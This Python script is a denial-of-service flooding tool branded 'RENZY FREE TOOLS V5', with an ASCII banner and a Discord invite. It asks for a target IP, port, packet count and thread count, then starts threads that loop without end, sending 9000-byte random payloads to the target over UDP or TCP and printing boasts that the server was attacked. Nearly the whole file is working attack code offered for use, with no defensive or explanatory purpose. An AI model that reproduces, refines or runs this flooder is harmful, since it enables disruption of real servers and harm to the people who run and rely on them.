#!/usr/bin/env python3
#RENZY FREE TOOLS V 5
import sys
import os
import random
import socket
import threading

os.system("clear")
print("""\x1b[1;92m
  _____   ______  _______ ______          __  __ 
 |  __ \ |___  / |__   __|  ____|   /\   |  \/  |
 | |__) |   / /     | |  | |__     /  \  | \  / |
 |  _  /   / /      | |  |  __|   / /\ \ | |\/| |
 | | \ \  / /__     | |  | |____ / ____ \| |  | |
 |_|  \_\/_____|    |_|  |______/_/    \_\_|  |_|
 """)
print("↪ TOOLS INFORMATION ↩")
print("↪ CREATOR : RENZY ARMSTRONG")
print("↪ VERSION : V5 ↩")
print("↪ COMMUNITY DISCORD ↩")
print("↪ https://discord.gg/HPsHHnhaXf↩")

ip = str(input(" IP :"))
port = int(input(" Port :"))
choice = str(input(" UDP Only (y/n)):"))
times = int(input(" Packet :"))
threads = int(input(" Thread :"))
os.system("clear")
def run():
	data = random._urandom(9000)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" RZ TEAM ATTACKED SERVER!!!")
		except:
			print("[!] Connection Time Out")

def run2():
	data = random._urandom(9000)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" RZ TEAM ATTACKED SERVER!!!")
		except:
			s.close()
			print("[*] Connection Time Out")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
